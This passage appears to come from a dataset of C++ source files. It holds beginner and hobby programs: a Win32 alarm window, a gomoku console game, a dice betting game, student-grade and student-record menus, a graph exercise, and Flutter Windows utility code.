0;\n\tint ret=BIO_write(memBio,content.c_str(), content.length());\n\tstd::cout << ret << std::endl;\n\tstd::cout << written << std::endl;\n\tstd::cout << buf << std::endl;*/\n\treturn 0;\n}\n",
    "#include <windows.h>\r\n#include <string>\r\n\r\n//#define IDI_MYICON 901\r\n#define ID_BUTTON_CLOSE 101\r\n#define ID_BUTTON_SETTINGS 102\r\n#define ID_BUTTON_ALERTE 103\r\n#define ID_EDIT_STOP 104\r\n#define ID_EDIT_HOUR 201\r\n#define ID_EDIT_MINUTE 202\r\n#define ID_EDIT_CHOIX 203\r\n#define ID_EDIT_HOURS 301\r\n#define ID_EDIT_MINUTES 302\r\n#define ID_EDIT_HOURS_MINUTES_SEND 303\r\n#define ID_EDIT_SAISIE 304\r\n// Convertit un nombre en cha\u00eene de caract\u00e8res wide string\r\nstd::wstring to_wstring(int number) {\r\n    return std::to_wstring(number);\r\n}\r\n\r\nSYSTEMTIME chosenTime; // Variable globale pour stocker l'heure choisie\r\nCOLORREF chosenColor; // Variable globale pour stocker la couleur choisie\r\n\r\nbool saisie_State = false;\r\nint Savebox_w, Savebox_h, Savebox_x, Savebox_y, New_w, New_h, New_x, New_y;\r\n// ici alerte AlerteActive(); permet de desactiver l'alerte et de vider les champs heure et minute\r\n// si l'alerte est activ\u00e9e alors il fautra appuyer sur le bouton point pour la desactiver.\r\n// si l'alerte est active alors la couleure de fond de passe par toutes les couleur de fa\u00e7on cyclique.\r\nbool isAlerteActive = false;\r\n\r\nHWND hwndMain;\r\n\r\nenum { COLOR_BLUE, COLOR_RED, COLOR_GREEN, COLOR_YELLOW, COLOR_PURPLE, COLOR_ORANGE };\r\nCOLORREF colors[] = { RGB(0, 0, 255), RGB(255, 0, 0), RGB(0, 255, 0), RGB(255, 255, 0), RGB(128, 0, 128), RGB(255, 165, 0) };\r\n\r\nDWORD WINAPI BackgroundThreadFunc(LPVOID lpParam);\r\nLRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);\r\nvoid ShowSettingsDialog(HWND hwndParent);\r\nvoid InitializeGlobals();\r\nvoid SimulateTimeSelection();\r\nvoid SimulateColorSelection();\r\nvoid SetSaveNewvalue(HWND hwnd);\r\n//inventaire index\r\n//void  AlerteActive() {};\r\n//void ChangeBackgroundColor(HWND hwnd, COLORREF color) {}\r\n\r\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\r\n    InitializeGlobals();\r\n\r\n    MSG messages;\r\n    WNDCLASS wc = { 0 };\r\n\r\n\r\n    wc.hInstance = hInstance;\r\n    wc.lpszClassName = L\"MainClass\";\r\n    wc.lpfnWndProc = WindowProcedure;\r\n    wc.style = CS_DBLCLKS;\r\n    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);\r\n    wc.hCursor = LoadCursor(NULL, IDC_ARROW);\r\n    wc.lpszMenuName = NULL;\r\n    wc.cbClsExtra = 0;\r\n    wc.cbWndExtra = 0;\r\n    wc.hbrBackground = (HBRUSH)COLOR_BACKGROUND;\r\n\r\n    if (!RegisterClass(&wc)) return 0;\r\n\r\n    hwndMain = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOPMOST, L\"MainClass\", L\"FabAlarme\", WS_POPUP | WS_VISIBLE | WS_THICKFRAME, CW_USEDEFAULT, CW_USEDEFAULT, 85, 70, HWND_DESKTOP, NULL, hInstance, NULL);\r\n    SetLayeredWindowAttributes(hwndMain, 0, (255 * 75) / 100, LWA_ALPHA);\r\n\r\n    CreateWindow(L\"BUTTON\", L\"X\", WS_VISIBLE | WS_CHILD, 45, 10, 20, 20, hwndMain, (HMENU)ID_BUTTON_CLOSE, hInstance, NULL);\r\n    CreateWindow(L\"BUTTON\", L\"O\", WS_VISIBLE | WS_CHILD, 5, 10, 20, 20, hwndMain, (HMENU)ID_BUTTON_SETTINGS, hInstance, NULL);\r\n    CreateWindow(L\"BUTTON\", L\".\", WS_VISIBLE | WS_CHILD, 25, 20, 20, 20, hwndMain, (HMENU)ID_BUTTON_ALERTE, hInstance, NULL);\r\n    // Cr\u00e9ation des champs de saisie pour l'heure et les minutes\r\n    HWND hwndHourEdit = CreateWindow(L\"EDIT\", L\"23\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 15, 50, 40, 20, hwndMain, (HMENU)ID_EDIT_HOUR, NULL, NULL);\r\n    HWND hwndMinuteEdit = CreateWindow(L\"EDIT\", L\"59\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 70, 50, 40, 20, hwndMain, (HMENU)ID_EDIT_MINUTE, NULL, NULL);\r\n    HWND hwndsStopEdit = CreateWindow(L\"EDIT\", L\"<--- Stoper l'alarme!\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 140, 20, 140, 20, hwndMain, (HMENU)ID_EDIT_STOP, NULL, NULL);\r\n    HWND hwndsChoixEdit = CreateWindow(L\"EDIT\", L\"<--- Alarme choisie.\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 140, 50, 140, 20, hwndMain, (HMENU)ID_EDIT_CHOIX, NULL, NULL);\r\n    HWND hwndsSaisieEdit = CreateWindow(L\"EDIT\", L\"<--- Zone de saisie.\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 140, 90, 140, 20, hwndMain, (HMENU)ID_EDIT_SAISIE, NULL, NULL);\r\n    // Passer des champs en lecture seule\r\n    SendMessage(hwndHourEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndMinuteEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndsStopEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndsChoixEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndsSaisieEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    //Formulaire\r\n    CreateWindow(L\"EDIT\", L\"HH \", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 15, 90, 40, 20, hwndMain, (HMENU)ID_EDIT_HOURS, NULL, NULL);\r\n    CreateWindow(L\"EDIT\", L\"MM\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 70, 90, 40, 20, hwndMain, (HMENU)ID_EDIT_MINUTES, NULL, NULL);\r\n    CreateWindow(L\"BUTTON\", L\"Enregistrer!\", WS_VISIBLE | WS_CHILD, 15, 115, 95, 20, hwndMain, (HMENU)ID_EDIT_HOURS_MINUTES_SEND, hInstance, NULL);\r\n    ShowWindow(hwndMain, nCmdShow);\r\n\r\n    //\r\n  \r\n    HICON hIcon = LoadIcon(NULL, IDI_APPLICATION);\r\n    if (hIcon) {\r\n        SendMessage(hwndMain, WM_SETICON, ICON_BIG, (LPARAM)hIcon);\r\n        SendMessage(hwndMain, WM_SETICON, ICON_SMA",
    "//Bobokulov Asilbek 230092 FCS1\n//CS 111 Data Structures and Algorithms\n#include<bits/stdc++.h>\nusing namespace std;\nvoid bfs(vector<vector<int>> adjList, vector<vector<int>> vec, int startNode){\n    int sum = 0;\n    for(auto x:adjList[startNode]){\n        sum += vec[startNode][x];\n    }\n    cout << sum;\n}\nint main()\n{\n    int n, e; //cin >> n >> e;\n    vector<vector<int>> vec(6, vector<int>(6));\n    vector<vector<int>> adjList;\n    adjList = { {1, 5}, {0, 2, 3}, {1, 4, 5}, {1, 4, 5}, {2, 3}, {0, 2, 3}  };\n    vec[0][5] = 25; vec[5][0] = 25;\n    vec[1][0] = 12; vec[0][1] = 12;\n    vec[1][2] = 13; vec[2][1] = 13;\n    vec[1][3] = 15; vec[3][1] = 15;\n    vec[3][5] = 13; vec[5][3] = 13;\n    vec[2][4] = 5; vec[4][2] = 5;\n    vec[2][5] = 2; vec[5][2] = 2;\n    vec[4][3] = 5; vec[3][4] = 5;\n    /*\n    for(int i = 0; i < e; i++){\n        int u, v, w; cin >> u >> v >> w;\n        adjList[u].push_back(v);\n        adjList[v].push_back(u);\n        vec[u][v] = w;\n        vec[v][u] = w;\n    }\n    */\n    int startNode;\n    cin >> startNode;\n    bfs(adjList, vec, startNode);\n}\n/*\n6 8\n0 1 12\n0 5 25\n1 2 13\n2 4 5\n2 5 2\n4 3 5\n1 3 15\n5 3 13\n0\n*/\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\ufeff#include <iostream>\n#include <string>\n#include <Windows.h>\n#include <iomanip>\n#include <stdio.h>\n#include <conio.h>\n#include <time.h>\n#include <stack>\n#define MAX 100\nusing namespace std;\n\nvoid textcolor(int x) {\n\tHANDLE mau;\n\tmau = GetStdHandle(STD_OUTPUT_HANDLE);\n\tSetConsoleTextAttribute(mau, x);\n}\n\nvoid gotoxy(int x, int y) {\n\tHANDLE hConsoleOutput;\n\tCOORD Cursor_an_Pos = { x - 1, y - 1 };\n\thConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);\n\tSetConsoleCursorPosition(hConsoleOutput, Cursor_an_Pos);\n}\n\nstruct ToaDo\n{\n\tint x, y;\n};\ntypedef struct ToaDo toado;\n\nchar KiemTraHangNgang(char a[MAX][MAX], int n, int vitridong, int vitricot) {\n\tint dem = 1; //T\u00ednh lu\u00f4n qu\u00e2n v\u1eeba \u0111\u00e1nh\n\n\t//X\u00e9t b\u00ean tr\u00e1i tr\u01b0\u1edbc (Ngang tr\u00e1i)\n\tfor (int j = vitricot - 1; j >= 0; --j) {\n\t\tif (a[vitridong][j] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[vitridong][vitricot];\n\t\t\t}\n\t\t}\n\t\telse //Kh\u00f4ng c\u00f2n t\u00ednh li\u00ean t\u1ee5c => d\u1eebng qu\u00e1 tr\u00ecnh l\u1eb7p \n\t\t{\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t//X\u00e9t qua b\u00ean ph\u1ea3i (ngang ph\u1ea3i)\n\tfor (int j = vitricot + 1; j < n; ++j) {\n\t\tif (a[vitridong][j] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t}\n\t\tif (dem == 5) {\n\t\t\treturn a[vitridong][vitricot];\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn '.'; // Ch\u01b0a th\u1eafng\n}\n\nchar KiemTraHangDoc(char a[MAX][MAX], int n, int vitridong, int vitricot) {\n\tint dem = 1;\n\tfor (int j = vitridong - 1; j >= 0; --j) {\n\t\tif (a[j][vitricot] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[vitridong][vitricot];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tfor (int j = vitridong + 1; j < n; ++j) {\n\t\tif (a[j][vitricot] == a[vitridong][vitricot]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[vitridong][vitricot];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn '.';\n}\n\nchar KiemTraHangCheoChinh(char a[MAX][MAX], int n, int m, int x, int y) {\n\tint dem = 1;\n\n\t//Ki\u1ec3m tra ch\u00e9o ch\u00ednh tr\u00ean \n\tint i = x - 1;\n\tint j = y - 1;\n\twhile (true) {\n\t\tif (i < 0 || j < 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[i][j] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\n\t\ti--;\n\t\tj--;\n\t}\n\n\ti = x + 1;\n\tj = y + 1;\n\twhile (true) {\n\t\tif (i > n || j > m) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[j][i] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t\ti++;\n\t\tj++;\n\t}\n\n\treturn '.';\n}\n\nchar KiemTraCheoPhu(char a[MAX][MAX], int n, int m, int x, int y) {\n\tint dem = 1;\n\tint i = x - 1;\n\tint j = y + 1;\n\n\twhile (true) {\n\t\tif (i < 0 || j == m) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[i][j] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t\ti--;\n\t\tj++;\n\t}\n\n\ti = x + 1;\n\tj = y - 1;\n\twhile (true) {\n\t\tif (i == n || j < 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\tif (a[i][j] == a[x][y]) {\n\t\t\tdem++;\n\t\t\tif (dem == 5) {\n\t\t\t\treturn a[x][y];\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t\ti++;\n\t\tj--;\n\t}\n\n\treturn '.';\n}\n\nvoid BanCo(int n, int m, int crdong, int cdcot, char c[][MAX]) {\n\t// Ch\u00fa \u00fd nh\u1eefng k\u00fd t\u1ef1 sau \u00e2\u00e2y:\n\t// i = 218 => i- : g\u00f3c tr\u00ean c\u00f9ng b\u00ean tr\u00e1i\n\t// i = 191 => -i : g\u00f3c tr\u00ean c\u00f9ng b\u00ean ph\u1ea3i\n\t// i = 217 => _I : g\u00f3c d\u01b0\u1edbi c\u00f9ng b\u00ean ph\u1ea3i\n\t// i = 192 => |_ : g\u00f3c du\u1edbi c\u00f9ng b\u00ean tr\u00e1i\n\t// i = 196 => _\n\t// i = 179 => |\n\t// i = 194 => T\n\t// i = 193 => T ng\u01b0\u1ee3c\n\t// i = 195 => |-\n\t// i = 180 => -|\n\t// i = 197 => + l\u1edbn\n\n\tint kc = log10(crdong) + 1;\n\tcout << setw(crdong / 2 + 4);\n\t//cout << \"\\t\" << setw(cddong / 2 + 1);\n\tfor (int i = 0; i < m - 1 ; ++i) {\n\t\tcout << i;\n\t\tcout << setw(crdong + 1);\n\t}\n\tcout << m - 1 << endl;\n\n\n\tstring a, b;\n\tfor (int i = 0; i < crdong; ++i) {\n\t\ta += (char)196;\n\t}\n\n\t\n\t//for (int j = 0; j < socot; ++j) {\n\t//\tb = b + (char)179 + \"\\n\" + b;\n\t//}\n\n\tb = (char)179;\n\n\t//H\u00e0ng tr\u00ean\n\tcout << setw(3) << (char)218;\n\tfor (int i = 1; i < m; ++i) {\n\t\tcout << a << (char)194;\n\n\t}\n\tcout << a << (char)191;\n\n\t//H\u00e0ng gi\u1eefa\n\tfor (int i = 1; i < n; ++i) {\n\t\tint size = 3 - log10(i + 1);\n\t\t//Ph\u1ea7n c\u1ed9t\n\t\tfor (int cd = 0; cd < cdcot; ++cd) {\n\t\t\tcout << \"\\n\";\n\t\t\t// Ph\u1ea7n s\u1ed1\n\t\t\tif (cd == cdcot / 2) {\n\t\t\t\tcout << i << setw(size);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << setw(3);\n\t\t\t}\n\t\t\tfor (int j = 0; j < m; ++j) {\n\t\t\t\tcout << b;\n\t\t\t\tfor (int kc = 0; kc < crdong; ++kc) {\n\t\t\t\t\tif (kc != crdong / 2) {\n\t\t\t\t\t\tcout << \" \";\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tif (c[i][j] == 'x' || c[i][j] == 'o') {\n\t\t\t\t\t\t\tc[i][j] == 'x' ? textcolor(13 + 32) : textcolor(14 + 32);\n\t\t\t\t\t\t\tcout << c[i][j];\n\t\t\t\t\t\t\ttextcolor(7);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tcout << \" \";\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t}\n\t\t\tcout << b;\n\t\t}\n\n\n\t\tif (i == n - 1) {\n\t\t\tbreak;\n\t\t}\n\n\t\t//Ph\u1ea7n d\u00f2ng\n\t\tcout << \"\\n\" << setw(3) << (char)195;\n\t\tfor (int j = 1; j < m; ++j) {\n\t\t\tcout << a << (char)197;\n\t\t}\n\t\tcout << a << (char)180;\n\t}\n\n\t//H\u00e0ng d\u01b0\u1edbi\n\tcout << \"\\n\" << setw(3) << (char)192;\n\tfor (int i = 1; i < m; ++i) {\n\t\tcout << a << (char)193;\n\t}\n\tcout << a << (char)217;\n}\n\n//=============== \u0110\u00e1nh b\u1eb1ng t\u1ecda \u0111\u1ed9 ==================\n// ==================== C\u00e1ch 1:\nvoid ToaDoCanDanh(int &luotdi, char a[][MAX], int n, int m, int crdong, int cdcot) {\n\tint x, y;\n\tchar quanco;\n\tquanco = luotdi == 0 ? 'x' : 'o';\n\tcout << \"\\nLuot di hien tai cua quan co: \";\n\tif (quanco == 'x') {\n\t\ttextcolor(13);\n\t\tcout << ",
    "#include <iostream>\r\n#include <string>\r\n#include <fstream>\r\n#include <ctime>\r\nusing namespace std;\r\n\r\nvoid drawLine( int n, char symbol);\r\nvoid rules();\r\nint main()\r\n{\r\n    ofstream outdata;\r\n    outdata.open(\"Record.txt\",ios::app);\r\n    string playerName;\r\n    float amount;\r\n    float bettingAmount;\r\n    float guess;\r\n    float dice;\r\n    char choice;\r\n\r\n    srand(time(0));\r\n    system(\"color 6\");\r\n\r\n    drawLine(80,'_');\r\n    cout<<\"\\n   *****      *        *********   *********  **     **    ********     \";\r\n    cout<<\"\\n **          *  *      **             ***     ** *   **   **      **    \";\r\n    cout<<\"\\n**          *    *     *********      ***     **  *  **   **      **    \";\r\n    cout<<\"\\n **        ********           **      ***     **   * **   **      **    \";\r\n    cout<<\"\\n   *****  *        *   *********   *********  **     **    ********   \\n\";\r\n    drawLine(80,'_');\r\n\r\n    cout << \"\\n\\nEnter Your Name : \";\r\n    getline(cin, playerName);\r\n    outdata<<playerName<<\"\\t\\t\";\r\n\r\n    cout << \"\\n\\nEnter Deposit amount to play game : $\";\r\n    cin >> amount;\r\n    outdata<<\"Balance is \"<<amount<<\"\\t\\t\";\r\n\r\n    do\r\n    {\r\n        system(\"cls\");\r\n        rules();\r\n        cout << \"\\n\\nYour current balance is $ \" << amount << \"\\n\";\r\n\r\n\r\n        do\r\n        {\r\n            cout <<playerName<<\", enter money to bet : $\";\r\n            cin >> bettingAmount;\r\n            outdata<<\"\\n  Bet Amount is: \"<<bettingAmount;\r\n            if(bettingAmount > amount)\r\n                cout << \"Your betting amount is more than your current balance\\n\"\r\n                       <<\"\\nRe-enter data\\n \";\r\n        }while(bettingAmount > amount);\r\n\r\n\r\n        do\r\n        {\r\n            cout << \"Guess your number to bet between 1 to 10 :\";\r\n            cin >> guess;\r\n            if(guess <= 0 || guess > 10)\r\n                cout << \"Please check the number!! should be between 1 to 10\\n\"\r\n                    <<\"\\nRe-enter data\\n \";\r\n        }while(guess <= 0 || guess > 10);\r\n\r\n        dice = rand()%10 + 1;\r\n        if(dice == guess)\r\n        {\r\n            cout << \"\\n\\nGood Luck!! You won Rs.\" << bettingAmount * 10;\r\n            amount = amount + bettingAmount * 10 ;\r\n            outdata<<\"\\n  Good Luck!! You won Rs.\" <<bettingAmount * 10;\r\n            outdata<<\"\\n-->NOW YOUR NEW BALANCE IS: \" <<amount ;\r\n        }\r\n        else\r\n        {\r\n            cout << \"Bad Luck this time !! You lost $ \"<< bettingAmount <<\"\\n\";\r\n            amount = amount - bettingAmount;\r\n            outdata<<\"\\n  Bad Luck this time !! You lost $ \" <<bettingAmount;\r\n            outdata<<\"\\n-->NOW YOUR NEW BALANCE IS: \" <<amount;\r\n        }\r\n\r\n        cout << \"\\nThe winning number was : \" << dice <<\"\\n\";\r\n        cout << \"\\n\"<<playerName<<\", You have $ \" << amount << \"\\n\";\r\n        if(amount == 0)\r\n        {\r\n            cout << \"You have no money to play \";\r\n            break;\r\n        }\r\n        cout << \"\\n\\n-->Do you want to play again (y/n)? \";\r\n        cin >> choice;\r\n    }while(choice =='Y'|| choice=='y');\r\n\r\n    cout << \"\\n\\n\\n\";\r\n    drawLine(70,'=');\r\n    cout << \"\\n\\nThanks for playing game. Your balance amount is $ \" << amount << \"\\n\\n\";\r\n    outdata << \"\\n\\nThanks for playing game. Your balance amount is $ \" << amount<< \"\\n\\n\";\r\n    drawLine(70,'=');\r\n\r\n    return 0;\r\n}\r\n\r\nvoid drawLine(int n, char symbol)\r\n{\r\n    for(int i=0; i<n; i++)\r\n        cout << symbol;\r\n    cout << \"\\n\" ;\r\n}\r\n\r\nvoid rules()\r\n{\r\n    system(\"cls\");\r\n    cout << \"\\n\\n\";\r\n    drawLine(80,'-');\r\n    cout << \"\\t\\tRULES OF THE GAME\\n\";\r\n    drawLine(80,'-');\r\n    cout << \"\\t1. Choose any number between 1 to 10\\n\";\r\n    cout << \"\\t2. If you win you will get 10 times of money you bet\\n\";\r\n    cout << \"\\t3. If you bet on wrong number you will lose your betting amount\\n\\n\";\r\n    drawLine(80,'-');\r\n\r\n\r\n}\r\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <iomanip>\r\n\r\nstruct Student {\r\n    std::string name;\r\n    std::vector<double> grades;\r\n};\r\n\r\nint main() {\r\n    std::vector<Student> students;\r\n    char choice;\r\n\r\n    do {\r\n        std::cout << \"1. Add Student\\n\";\r\n        std::cout << \"2. Add Grade for Student\\n\";\r\n        std::cout << \"3. Calculate Average Grade\\n\";\r\n        std::cout << \"4. View Students and Grades\\n\";\r\n        std::cout << \"5. Quit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n\r\n        switch(choice) {\r\n            case '1':\r\n                {\r\n                    Student newStudent;\r\n                    std::cout << \"Enter student name: \";\r\n                    std::cin >> newStudent.name;\r\n                    students.push_back(newStudent);\r\n                }\r\n                break;\r\n            case '2':\r\n                {\r\n                    std::string studentName;\r\n                    double grade;\r\n                    std::cout << \"Enter student name: \";\r\n                    std::cin >> studentName;\r\n                    bool found = false;\r\n                    for (auto& student : students) {\r\n                        if (student.name == studentName) {\r\n                            std::cout << \"Enter grade for \" << studentName << \": \";\r\n                            std::cin >> grade;\r\n                            student.grades.push_back(grade);\r\n                            found = true;\r\n                            break;\r\n                        }\r\n                    }\r\n                    if (!found) {\r\n                        std::cout << \"Student not found!\\n\";\r\n                    }\r\n                }\r\n                break;\r\n            case '3':\r\n                {\r\n                    std::string studentName;\r\n                    std::cout << \"Enter student name: \";\r\n                    std::cin >> studentName;\r\n                    bool found = false;\r\n                    for (const auto& student : students) {\r\n                        if (student.name == studentName) {\r\n                            double total = 0;\r\n                            for (const auto& grade : student.grades) {\r\n                                total += grade;\r\n                            }\r\n                            double average = total / student.grades.size();\r\n                            std::cout << \"Average grade for \" << studentName << \": \" << std::fixed << std::setprecision(2) << average << std::endl;\r\n                            found = true;\r\n                            break;\r\n                        }\r\n                    }\r\n                    if (!found) {\r\n                        std::cout << \"Student not found!\\n\";\r\n                    }\r\n                }\r\n                break;\r\n            case '4':\r\n                {\r\n                    std::cout << \"Students and Grades:\\n\";\r\n                    for (const auto& student : students) {\r\n                        std::cout << \"Student: \" << student.name << \", Grades: \";\r\n                        for (const auto& grade : student.grades) {\r\n                            std::cout << grade << \" \";\r\n                        }\r\n                        std::cout << std::endl;\r\n                    }\r\n                }\r\n                break;\r\n            case '5':\r\n                std::cout << \"Exiting program...\";\r\n                break;\r\n            default:\r\n                std::cout << \"Invalid choice!\\n\";\r\n                break;\r\n        }\r\n    } while (choice != '5');\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "/*-----------------------------------------------------------\r\nPr. No : 11\r\nTitle : Department maintains a student information. The file contains roll number, name, division and address. Allow user to add, delete information of student. Display information of particular employee. If record of student does not exist an appropriate message is displayed. If it is, then the system displays the student details. Use sequential file to main the data.\r\n\r\n------------------------------------------------------------*/\r\n\r\n#include<iostream> \r\n#include<fstream> \r\n#include<string.h> \r\nusing namespace std; \r\n\r\nstruct stud \r\n{ \r\n    int roll; \r\n    char name[10]; \r\n    char div; \r\n    char add[10]; \r\n}rec; \r\n\r\n\r\nclass student \r\n{ \r\n    public:      \r\n    void create(); \r\n    void display(); \r\n    int search(); \r\n    void Delete(); \r\n}; \r\n\r\nvoid student::create() \r\n { \r\n    char ans; \r\n    ofstream fout; \r\n    fout.open(\"stud.dat\",ios::out|ios::binary); \r\n    do \r\n    { \r\n        cout<<\"\\n\\tEnter Roll No of Student : \"; \r\n        cin>>rec.roll; \r\n        cout<<\"\\n\\tEnter a Name of Student : \"; \r\n        cin>>rec.name; \r\n        cout<<\"\\n\\tEnter a Division of Student : \"; \r\n        cin>>rec.div; \r\n        cout<<\"\\n\\tEnter a Address of Student : \"; \r\n        cin>>rec.add; \r\n        fout.write((char *)&rec,sizeof(stud))<<flush; \r\n        cout<<\"\\n\\tDo You Want to Add More Records: \"; \r\n        cin>>ans; \r\n    }while(ans=='y'||ans=='Y'); \r\n    fout.close(); \r\n} \r\n\r\nvoid student::display() \r\n{ \r\n    ifstream fin;\r\n    fin.open(\"stud.dat\",ios::in|ios::binary); \r\n    fin.seekg(0,ios::beg); \r\n    cout<<\"\\n\\tThe Content of File are:\\n\"; \r\n    cout<<\"\\n\\tRoll\\tName\\tDiv\\tAddress\"; \r\n    while(fin.read((char *)&rec,sizeof(stud))) \r\n    { \r\n        if(rec.roll!=-1) \r\n        cout<<\"\\n\\t\"<<rec.roll<<\"\\t\"<<rec.name<<\"\\t\"<<rec.div<<\"\\t\"<<rec.add;  \r\n        \r\n    } \r\n        fin.close(); \r\n} \r\n\r\nint student::search() \r\n{ \r\n    int r,i=0; \r\n    ifstream fin; \r\n    fin.open(\"stud.dat\",ios::in|ios::binary); \r\n    fin.seekg(0,ios::beg); \r\n    cout<<\"\\n\\tEnter a Roll No: \"; \r\n    cin>>r; \r\n    \r\n    while(fin.read((char *)&rec,sizeof(stud))) \r\n    { \r\n        if(rec.roll==r) \r\n        { \r\n            cout<<\"\\n\\tRecord Found...\\n\"; \r\n            cout<<\"\\n\\tRoll\\tName\\tDiv\\tAddress\"; \r\n            cout<<\"\\n\\t\"<<rec.roll<<\"\\t\"<<rec.name<<\"\\t\"<<rec.div<<\"\\t\"<<rec.add; \r\n            return i; \r\n        } \r\n        i++; \r\n    } \r\n    fin.close(); \r\n    return 0; \r\n} \r\n\r\nvoid student::Delete() \r\n{ \r\n    int pos; \r\n    pos=search(); \r\n    fstream f; \r\n    f.open(\"stud.dat\",ios::in|ios::out|ios::binary); \r\n    f.seekg(0,ios::beg); \r\n    if(pos==0) \r\n    { \r\n        cout<<\"\\n\\tRecord Not Found\"; \r\n        return; \r\n    } \r\n    int offset=pos*sizeof(stud); \r\n    f.seekp(offset); \r\n    rec.roll=-1; \r\n    strcpy(rec.name,\"NULL\"); \r\n    rec.div='N'; \r\n    strcpy(rec.add,\"NULL\");\r\n    f.write((char *)&rec,sizeof(stud)); \r\n    f.seekg(0); \r\n    f.close(); \r\n    cout<<\"\\n\\tRecord Deleted\"; \r\n } \r\n \r\nint main() \r\n{ \r\n       student obj; \r\n       int ch,key; \r\n       char ans; \r\n       do \r\n       { \r\n              cout<<\"\\n\\t***** Student Information *****\"; \r\n              cout<<\"\\n\\t1. Create\\n\\t2. Display\\n\\t3. Delete\\n\\t4.  Search\\n\\t5. Exit\"; \r\n              cout<<\"\\n\\t..... Enter Your Choice: \"; \r\n              cin>>ch; \r\n              switch(ch) \r\n              { \r\n              case 1: obj.create(); \r\n              break; \r\n              case 2: obj.display(); \r\n              break; \r\n              case 3: obj.Delete(); \r\n              break; \r\n              case 4: key=obj.search(); \r\n              break; \r\n              case 5: \r\n              break; \r\n              } \r\n              cout<<\"\\n\\t..... Do You Want to Continue in Main Menu: \"; cin>>ans; \r\n      